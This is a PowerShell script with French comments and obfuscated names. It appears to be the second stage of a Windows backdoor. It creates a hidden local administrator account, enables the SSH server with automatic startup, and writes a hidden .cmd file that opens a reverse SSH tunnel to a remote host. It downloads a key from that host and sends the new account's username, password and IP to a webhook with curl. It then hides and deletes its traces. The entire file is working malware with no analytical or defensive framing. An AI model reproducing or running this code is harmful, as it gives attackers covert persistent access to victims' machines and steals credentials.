$nkowFESgaO = "username"
$ecPlmJVLRo = "X.X.X.X"
$ENyMAhIrsb = "22"
$YlEQgBmePn = "2583"

$dERQpoZWxz = "$nkowFESgaO@$ecPlmJVLRo"

Function Test-PortAvailability {
    param (
        [int] $Port
    )
    process {
        $tcpClient = New-Object System.Net.Sockets.TcpClient
        try {
            $tcpClient.Connect("localhost", $Port)
            $tcpClient.Close()
            return $false
        } catch {
            return $true
        }
    }
}

Function Get-RandomPort {
    param (
        [int] $min = 1024,
        [int] $max = 65535
    )
    process {
        do {
            $port = Get-Random -Minimum $min -Maximum $max
            $available = Test-PortAvailability -Port $port
        } while (-not $available)
        return $port
    }
}

$YlEQgBmePn = Get-RandomPort

Function Get-RandomAlphanumericString {
	-join ((65..90) + (97..122) | Get-Random -Count 10 | % {[char]$_})
}

$fr = Get-RandomAlphanumericString
$temp = "$env:TEMP/$fr"
$init_path = Get-Location

mkdir  $temp
cd $temp
cd $init_path

# Création d'un local admin
function PklIyfgtrfjd {
    [CmdletBinding()]
    param (
        [string] $JhfuihdfOm,
        [securestring] $lOjgyNbsdsdsg
    )    
    begin {
    }    
    process {
        New-LocalUser -Name $JhfuihdfOm -Password $lOjgyNbsdsdsg -FullName $JhfuihdfOm -Description "Compte utilisateur invite"
        Add-LocalGroupMember -Group "Administrateurs" -Member $JhfuihdfOm
    }    
    end {
    }
}

# Création de l'administrateur local
$name = Get-RandomAlphanumericString
$password = Get-RandomAlphanumericString

# Supprimer l'utilisateur seulement s'il existe
Remove-LocalUser -Name $name -ErrorAction SilentlyContinue

$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
PklIyfgtrfjd -JhfuihdfOm $name -lOjgyNbsdsdsg $securePassword

# registry
$jhdsfgLohfdTbdh = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList'
$vGfTFVDNnbf = '00000000'
New-Item -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name SpecialAccounts -Force
New-Item -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts' -Name UserList -Force
New-ItemProperty -Path $jhdsfgLohfdTbdh -Name $name -Value $vGfTFVDNnbf -PropertyType DWORD -Force

# ssh server : 
# TODO : add registre pour demarrage auto
Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0 # Ajoute un package de fonctionnalités au systeme d'exploitation EN COURS D'EXECUTION source : OpenSSH
Start-Service sshd
Set-Service -Name sshd -StartupType 'Automatic' # Persistence

# startup file
$GlNweBEFmh = Get-RandomAlphanumericString
$NyZnoLKCIs = Get-Location
Add-Content -Path "$NyZnoLKCIs/$GlNweBEFmh.cmd" -Value "@echo off"
Add-Content -Path "$NyZnoLKCIs/$GlNweBEFmh.cmd" -Value "start /min powershell.exe -windowstyle hidden -Command `"ssh-keygen -R $ecPlmJVLRo`""
Add-Content -Path "$NyZnoLKCIs/$GlNweBEFmh.cmd" -Value "start /min powershell.exe -windowstyle hidden -Command `"ssh -o ServerAliveInterval=30 -o StrictHostKeyChecking=no -R $YlEQgBmePn`:localhost:22 $dERQpoZWxz -i `$env:temp\key`""

# Fonction pour supprimer les lignes contenant l'adresse IP dans known_hosts
function Remove-KnownHostEntry {
    param (
        [string] $host
    )
    $knownHostsPath = "C:\Users\$env:UserName\.ssh\known_hosts"
    if (Test-Path $knownHostsPath) {
        $content = Get-Content $knownHostsPath
        $newContent = $content | Where-Object { $_ -notmatch $host }
        Set-Content -Path $knownHostsPath -Value $newContent
    }
}

Remove-KnownHostEntry -host $ecPlmJVLRo

# informations
Set-Location $temp

$dVbsxUYbndsd = "$env:UserName.txt"
$OjgfhgUyyg = (Get-NetIPConfiguration | Where-Object { $_.IPv4DefaultGateway -ne $null -and $_.NetAdapter.Status -ne "Disconnected"}).IPv4Address.IPAddress
New-Item -path "." -Name $dVbsxUYbndsd -Force

Add-Content -path "./$dVbsxUYbndsd" -Value $name -Force #username
Add-Content -path "./$dVbsxUYbndsd" -Value $OjgfhgUyyg -Force #ip
Add-Content -path "./$dVbsxUYbndsd" -Value $password -Force #pass
Add-Content -Path "./$dVbsxUYbndsd" -Value $env:temp # temp
Add-Content -Path "./$dVbsxUYbndsd" -Value "$NyZnoLKCIs\$GlNweBEFmh.cmd" # startup
Add-Content -Path "./$dVbsxUYbndsd" -Value $ecPlmJVLRo # remote host
Add-Content -Path "./$dVbsxUYbndsd" -Value $YlEQgBmePn # remote port
Add-Content -Path "./$dVbsxUYbndsd" -Value 'remote' # connection type

Invoke-WebRequest -Uri "http://$ecPlmJVLRo/key" -OutFile "$env:temp\key" 

$filePath = "C:\Users\$env:UserName\AppData\Local\Temp\fruHgdbsM.txt"

$webhookUrl = Get-Content -Path $filePath

Invoke-Expression "curl.exe -F `"payload_json={\```"username\```": \```"tobashiconsole\```", \```"content\```": \```"Download !\```"}`" -F ```"file=@$dVbsxUYbndsd```" $webhookUrl"

# escape
attrib +h +s +r C:\Users\$name
Set-Location ..
Remove-Item -Path ".\fruHgdbsM.txt" -Force
Remove-Item -Path ".\$fr" -Recurse -Force
start "$NyZnoLKCIs/$GlNweBEFmh.cmd"
Remove-Item -Path "C:\Users\$env:UserName\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\stage2_v.ps1" -Force


